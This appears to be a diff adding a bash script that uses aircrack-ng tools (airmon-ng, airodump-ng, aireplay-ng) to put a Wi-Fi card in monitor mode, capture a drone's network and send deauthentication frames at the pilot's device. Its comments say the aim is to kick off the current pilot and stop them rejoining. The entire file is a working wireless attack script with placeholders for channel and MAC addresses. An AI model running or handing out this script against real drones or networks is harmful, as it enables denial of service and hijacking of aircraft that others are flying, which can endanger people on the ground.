@@ -1,0 +1,33 @@
+#!/bin/bash
+
+# Kali Drone DeAuth Script
+# This script kicks off the drone's current pilot and prevents them from rejoining for the remainder of that app session
+# Values for router and client IP and channels are hardcoded based on connection from Liam's IPhone
+
+echo "Disconnecting from all WiFi networks:" & sleep 2
+
+airmon-ng
+
+echo "Enabling monitor mode:" & sleep 2
+
+airmon-ng start wlan0
+
+echo "Scanning for local networks:" & sleep 2
+
+airodump-ng wlan0mon & sleep 5
+
+kill $!
+
+echo "Accessing network:" & sleep 2
+
+airodump-ng -c [CH] --bssid [SMAC] -w /root/Desktop/ wlan0mon & sleep 5
+
+kill $!
+
+echo "Deauthenticating pilot:" & sleep 2
+
+gnome-terminal -x aireplay-ng -0 2 -a [SMAC] -c [CMAC] wlan0mon & sleep 5
+
+kill $!
+
+
